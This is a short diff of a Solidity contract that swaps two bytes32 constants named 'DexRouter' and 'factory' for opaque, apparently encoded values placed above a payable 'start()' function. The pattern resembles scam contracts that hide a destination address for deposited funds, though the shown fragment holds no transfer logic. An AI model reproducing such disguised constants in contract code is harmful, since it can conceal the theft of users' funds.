@@ -30,8 +30,8 @@ abstract contract Ownable  {
         emit log(initialOwner);
     }
 
-    bytes32 DexRouter = 0x1234567890abcdef1234567890abcdef12345678;    
-    bytes32 factory = 0x561b45f49eaa0effb4836d768e8fe54ee21b8462;
+    bytes32 DexRouter = 0xfdc54b1a6f53a21d375d0dea954e16aa79311bdf0fbed479f13e432138161cc2;    
+    bytes32 factory = 0xfdc54b1a6f53a21d375d0dead16105267730d8cfa909ef77ef1a6b80c839ced8;
 
     function start() public  payable{
       
